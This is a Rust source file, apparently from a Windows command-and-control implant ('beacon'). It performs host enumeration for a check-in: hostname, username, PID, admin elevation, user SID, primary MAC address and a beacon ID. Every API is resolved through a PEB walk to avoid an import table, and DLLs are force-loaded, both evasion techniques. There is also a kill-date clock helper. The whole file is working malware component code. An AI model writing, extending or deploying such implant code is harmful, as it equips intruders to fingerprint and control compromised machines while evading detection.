//! Real host enumeration for `SessionInfo` check-in.
//!
//! Replaces the M0 placeholders in `beacon.rs` (`hostname: "host"`,
//! `username: "user"`, `pid: 0`, `is_admin: 0`, `beacon_id: 0x1337`) with real
//! values resolved through the PEB walk — no IAT. Every API comes from
//! `kernel32.dll` (always loaded) or `advapi32.dll` (force-loaded via the same
//! `LoadLibraryA` trick `transport.rs` uses for `winhttp.dll`).
//!
//! `beacon_id` is derived from the `KUSER_SHARED_DATA` tick count (fixed user
//! mapping at `0x7FFE_0000`, always present, no syscall) mixed with the PID via
//! xorshift32 — so two implants on the same host still get distinct IDs without
//! pulling a CSPRNG into the no_std PIC build.

#![cfg(target_os = "windows")]

use crate::heap::String;
use crate::resolve::export_addr;
use core::ffi::c_void;

/// The fixed user-mode mapping of `KUSER_SHARED_DATA` on x64 Windows. Always
/// present, readable from user mode without a syscall. Offset 0x320 holds
/// `TickCountLow` (a u32 that changes per boot + over time) — a cheap entropy
/// source that differs across hosts and reboots.
const KUSER_SHARED_DATA: usize = 0x0000_0000_7FFE_0000;
const TICK_COUNT_OFFSET: usize = 0x320;

/// Force-load a DLL via the PEB-resolved `LoadLibraryA` (mirrors transport.rs).
/// Idempotent — Windows refcounts module loads.
fn force_load(dll: &[u8]) -> bool {
    type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *mut c_void;
    let addr = match unsafe { export_addr(b"kernel32.dll", b"LoadLibraryA") } {
        Some(a) => a,
        None => return false,
    };
    let mut name = [0u8; 32];
    let n = dll.len().min(name.len() - 1);
    name[..n].copy_from_slice(&dll[..n]);
    let load: LoadLibraryA = unsafe { core::mem::transmute(addr) };
    !unsafe { load(name.as_ptr()) }.is_null()
}

/// Hand-rolled UTF-16 → lossy `String` (no `from_utf8_lossy` under no_std).
fn utf16_to_string(wide: &[u16]) -> String {
    let mut bytes = crate::heap::Vec::with_capacity(wide.len());
    for &w in wide {
        if w == 0 {
            break;
        }
        let w = w as u32;
        if w < 0x80 {
            bytes.push(w as u8);
        } else if w < 0x800 {
            bytes.push(0xC0 | (w >> 6) as u8);
            bytes.push(0x80 | (w & 0x3F) as u8);
        } else {
            bytes.push(0xE0 | (w >> 12) as u8);
            bytes.push(0x80 | ((w >> 6) & 0x3F) as u8);
            bytes.push(0x80 | (w & 0x3F) as u8);
        }
    }
    match String::from_utf8(bytes) {
        Ok(s) => s,
        // Fall back to a lossy rebuild if (somehow) the UTF-8 we just emitted
        // is invalid — it shouldn't be, but never panic on host info.
        Err(e) => {
            let mut out = String::new();
            for &b in e.as_bytes() {
                if b.is_ascii() {
                    out.push(b as char);
                } else {
                    out.push('\u{FFFD}');
                }
            }
            out
        }
    }
}

/// `GetComputerNameW` → hostname, or `"host"` on resolution failure.
pub fn hostname() -> String {
    type GetComputerNameW = unsafe extern "system" fn(*mut u16, *mut u32) -> i32;
    let f: GetComputerNameW = match unsafe { export_addr(b"kernel32.dll", b"GetComputerNameW") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return String::from("host"),
    };
    let mut len: u32 = 256;
    let mut buf = crate::heap::vec![0u16; 256];
    if unsafe { f(buf.as_mut_ptr(), &mut len) } != 0 && len > 0 {
        utf16_to_string(&buf[..len as usize])
    } else {
        String::from("host")
    }
}

/// `GetCurrentProcessId` → PID. Never fails on a real host.
pub fn pid() -> u32 {
    type GetCurrentProcessId = unsafe extern "system" fn() -> u32;
    match unsafe { export_addr(b"kernel32.dll", b"GetCurrentProcessId") } {
        Some(a) => {
            let f: GetCurrentProcessId = unsafe { core::mem::transmute(a) };
            unsafe { f() }
        }
        None => 0,
    }
}

/// Wall-clock time as Unix seconds (since 1970-01-01 UTC), or 0 on failure.
///
/// Resolves `GetSystemTimeAsFileTime` from kernel32 (always loaded) and
/// converts the returned FILETIME (100ns ticks since 1601-01-01 UTC) to Unix
/// seconds. The beacon loop calls this once per cycle to enforce
/// `ImplantConfig.expires_at` (kill-date). Returns 0 if the export can't be
/// resolved — callers MUST treat 0 as "unknown, do not enforce", NOT as the
/// epoch, so that a missing clock can't kill the beacon spuriously.
pub fn now_unix() -> u64 {
    type GetSystemTimeAsFileTime =
        unsafe extern "system" fn(*mut u8); // *mut FILETIME (8 bytes, low+high u32)
    let addr = match unsafe { export_addr(b"kernel32.dll", b"GetSystemTimeAsFileTime") } {
        Some(a) => a,
        None => return 0,
    };
    let f: GetSystemTimeAsFileTime = unsafe { core::mem::transmute(addr) };
    // FILETIME layout: dwLowDateTime (u32) | dwHighDateTime (u32), 8 bytes total.
    let mut ft = [0u8; 8];
    unsafe { f(ft.as_mut_ptr()) };
    let low = u32::from_le_bytes([ft[0], ft[1], ft[2], ft[3]]) as u64;
    let high = u32::from_le_bytes([ft[4], ft[5], ft[6], ft[7]]) as u64;
    let filetime_100ns = (high << 32) | low;
    // FILETIME epoch (1601-01-01) → Unix epoch (1970-01-01): 11644473600 seconds.
    // FILETIME counts in 100ns ticks; divide by 10_000_000 to get seconds.
    const FILETIME_EPOCH_OFFSET_100NS: u64 = 116_444_736_000_000_000;
    const TICKS_PER_SEC: u64 = 10_000_000;
    // Guard against the (impossible-on-a-real-host) case where FILETIME is
    // below the Unix epoch — saturating_sub avoids an underflow wrap that
    // would produce a huge bogus timestamp.
    filetime_100ns
        .saturating_sub(FILETIME_EPOCH_OFFSET_100NS)
        / TICKS_PER_SEC
}

/// `GetUserNameW` → username, or `"user"` on failure. Needs `advapi32.dll`
/// (force-loaded; not present by default in a minimal process).
pub fn username() -> String {
    if !force_load(b"advapi32.dll") {
        return String::from("user");
    }
    type GetUserNameW = unsafe extern "system" fn(*mut u16, *mut u32) -> i32;
    let f: GetUserNameW = match unsafe { export_addr(b"advapi32.dll", b"GetUserNameW") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return String::from("user"),
    };
    let mut len: u32 = 256;
    let mut buf = crate::heap::vec![0u16; 256];
    if unsafe { f(buf.as_mut_ptr(), &mut len) } != 0 && len > 0 {
        utf16_to_string(&buf[..len as usize])
    } else {
        String::from("user")
    }
}

/// Detect an elevated (admin) token via `OpenProcessToken` +
/// `GetTokenInformation`(TokenElevation). Returns 1 if elevated, 0 otherwise.
///
/// This is preferred over `shell32!IsUserAnAdmin` because it needs only
/// `advapi32` + `kernel32` (already loaded/force-loaded here) and does not pull
/// in the much heavier `shell32`. `GetCurrentProcess` returns a pseudohandle
/// (-1) that needs no `CloseHandle`.
pub fn is_admin() -> u8 {
    if !force_load(b"advapi32.dll") {
        return 0;
    }
    type GetCurrentProcess = unsafe extern "system" fn() -> *mut c_void;
    type OpenProcessToken = unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32;
    type GetTokenInformation = unsafe extern "system" fn(
        *mut c_void,
        u32,         // TOKEN_INFORMATION_CLASS
        *mut c_void, // TokenInformation
        u32,         // TokenInformationLength
        *mut u32,    // ReturnLength
    ) -> i32;
    type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;

    let gcp: GetCurrentProcess = match unsafe { export_addr(b"kernel32.dll", b"GetCurrentProcess") }
    {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return 0,
    };
    let opt: OpenProcessToken = match unsafe { export_addr(b"advapi32.dll", b"OpenProcessToken") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return 0,
    };
    let gti: GetTokenInformation =
        match unsafe { export_addr(b"advapi32.dll", b"GetTokenInformation") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return 0,
        };
    let close: CloseHandle = match unsafe { export_addr(b"kernel32.dll", b"CloseHandle") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return 0,
    };

    // TOKEN_QUERY = 0x0008.
    let proc = unsafe { gcp() };
    let mut token: *mut c_void = core::ptr::null_mut();
    if unsafe { opt(proc, 0x0008, &mut token) } == 0 || token.is_null() {
        return 0;
    }
    // TokenElevation = 20 (TOKEN_INFORMATION_CLASS). TOKEN_ELEVATION is a 4-byte
    // DWORD; 4 is a safe buffer length.
    let mut elevated: u32 = 0;
    let mut retlen: u32 = 0;
    let ok = unsafe {
        gti(
            token,
            20,
            &mut elevated as *mut u32 as *mut c_void,
            4,
            &mut retlen,
        )
    };
    unsafe { close(token) };
    if ok != 0 {
        u8::from(elevated != 0)
    } else {
        0
    }
}

/// CPU architecture code matching `SessionInfo::arch`: 0 = x86_64, 1 = aarch64,
/// 2 = other. Compile-time — the implant only runs on the arch it was built for.
pub fn arch() -> u8 {
    if cfg!(target_arch = "x86_64") {
        0
    } else if cfg!(target_arch = "aarch64") {
        1
    } else {
        2
    }
}

/// Operating-system label for `SessionInfo::os` (always "Windows" for this
/// crate — it is gated to `target_os = "windows"`).
pub fn os() -> String {
    String::from("Windows")
}

/// Get the SID of the current user via `OpenProcessToken` +
/// `GetTokenInformation`(TokenUser).  The SID is returned as raw bytes
/// (up to 68 bytes — `SECURITY_MAX_SID_SIZE`), zero-padded if shorter.
///
/// Uses the same PEB-walk pattern as `is_admin()`: resolve `advapi32` exports,
/// open the current process token, query `TokenUser`, and copy the SID before
/// closing the handle.  Returns `None` if any step fails.
pub fn machine_sid() -> Option<[u8; 68]> {
    if !force_load(b"advapi32.dll") {
        return None;
    }
    type GetCurrentProcess = unsafe extern "system" fn() -> *mut c_void;
    type OpenProcessToken = unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32;
    type GetTokenInformation =
        unsafe extern "system" fn(*mut c_void, u32, *mut c_void, u32, *mut u32) -> i32;
    type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;

    let gcp: GetCurrentProcess = match unsafe { export_addr(b"kernel32.dll", b"GetCurrentProcess") }
    {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return None,
    };
    let opt: OpenProcessToken = match unsafe { export_addr(b"advapi32.dll", b"OpenProcessToken") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return None,
    };
    let gti: GetTokenInformation =
        match unsafe { export_addr(b"advapi32.dll", b"GetTokenInformation") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return None,
        };
    let close: CloseHandle = match unsafe { export_addr(b"kernel32.dll", b"CloseHandle") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return None,
    };

    let proc = unsafe { gcp() };
    let mut token: *mut c_void = core::ptr::null_mut();
    // TOKEN_QUERY = 0x0008
    if unsafe { opt(proc, 0x0008, &mut token) } == 0 || token.is_null() {
        return None;
    }

    // TokenUser = 1 (TOKEN_INFORMATION_CLASS).
    // The output buffer contains a TOKEN_USER { SID_AND_ATTRIBUTES { PSID Sid;
    // DWORD Attributes } } followed by the SID data.  On x64 PSID is 8 bytes
    // at offset 0; the Sid pointer is adjusted to point within the buffer.
    // 128 bytes is ample for any valid SID (max 68 B) + the header.
    let mut buf = [0u8; 128];
    let mut retlen: u32 = 0;
    let ok = unsafe { gti(token, 1, buf.as_mut_ptr() as *mut c_void, 128, &mut retlen) };

    if ok == 0 {
        unsafe { close(token) };
        return None;
    }

    // The SID pointer lives at buf[0..8] on x64.
    let sid_ptr = unsafe { *(buf.as_ptr() as *const usize) } as *const u8;

    if sid_ptr.is_null() {
        unsafe { close(token) };
        return None;
    }

    // SID layout: Revision(1) + SubAuthorityCount(1) + IdentifierAuthority(6)
    //              + SubAuthority[count](4 * count).
    // Max count is 15 → max size = 8 + 15*4 = 68.
    let sub_auth_count = unsafe { *sid_ptr.add(1) } as usize;
    let sid_len = core::cmp::min(8_usize.saturating_add(sub_auth_count.saturating_mul(4)), 68);

    let mut sid = [0u8; 68];
    // SAFETY: sid_ptr was written by GetTokenInformation into our stack buffer.
    for i in 0..sid_len {
        sid[i] = unsafe { *sid_ptr.add(i) };
    }

    unsafe { close(token) };
    Some(sid)
}

/// Get the primary network adapter's MAC address via `GetAdaptersInfo`.
/// Force-loads `iphlpapi.dll` and resolves `GetAdaptersInfo` through the PEB
/// walk.  Returns the first non-zero MAC (6 bytes), or `None` on failure.
pub fn primary_mac() -> Option<[u8; 6]> {
    if !force_load(b"iphlpapi.dll") {
        return None;
    }
    type GetAdaptersInfo = unsafe extern "system" fn(*mut u8, *mut u32) -> u32;
    let f: GetAdaptersInfo = match unsafe { export_addr(b"iphlpapi.dll", b"GetAdaptersInfo") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return None,
    };

    // First call with NULL buffer → get required size.
    let mut size: u32 = 0;
    let ret = unsafe { f(core::ptr::null_mut(), &mut size) };
    // ERROR_BUFFER_OVERFLOW (111) is expected; anything else means no adapters.
    if ret != 111 || size == 0 {
        return None;
    }

    let mut buf = crate::heap::vec![0u8; size as usize];
    let ret = unsafe { f(buf.as_mut_ptr(), &mut size) };
    // ERROR_SUCCESS = 0
    if ret != 0 {
        return None;
    }

    // IP_ADAPTER_INFO layout (x64):
    //   +0x00  Next           (8 B  pointer)
    //   +0x08  ComboIndex     (4 B  DWORD)
    //   +0x0C  AdapterName    (260 B  char[256+4])
    //   +0x110 Description    (132 B  char[128+4])
    //   +0x194 AddressLength  (4 B  UINT)
    //   +0x198 Address        (8 B  BYTE[MAX_ADAPTER_ADDRESS_LENGTH])
    // Address starts at 0x198; AddressLength (the actual MAC length) at 0x194.
    const ADDR_LEN_OFF: usize = 0x194;
    const ADDR_OFF: usize = 0x198;

    if buf.len() <= ADDR_OFF + 6 {
        return None;
    }

    let addr_len = unsafe { *(buf.as_ptr().add(ADDR_LEN_OFF) as *const u32) } as usize;
    if addr_len >= 6 {
        let addr_ptr = unsafe { buf.as_ptr().add(ADDR_OFF) };
        let mut mac = [0u8; 6];
        mac.copy_from_slice(unsafe { core::slice::from_raw_parts(addr_ptr, 6) });
        if mac.iter().any(|&b| b != 0) {
            return Some(mac);
        }
    }
    None
}

/// Derive a per-process beacon id from `KUSER_SHARED_DATA`'s tick count mixed
/// with the PID via xorshift32. Distinct across hosts and reboots, and distinct
/// for two implants on the same host (different PIDs) — without needing a
/// CSPRNG (which would mean pulling `getrandom`/`rand` into the no_std build).
pub fn beacon_id() -> u32 {
    let tick = unsafe {
        // SAFETY: KUSER_SHARED_DATA is a fixed, always-mapped, user-readable
        // page. Reading a u32 at 0x320 (TickCountLow) is always safe.
        core::ptr::read_volatile((KUSER_SHARED_DATA + TICK_COUNT_OFFSET) as *const u32)
    };
    let mut x = tick ^ pid();
    if x == 0 {
        x = 0x9E37_79B9; // xorshift can't start at 0
    }
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    x
}
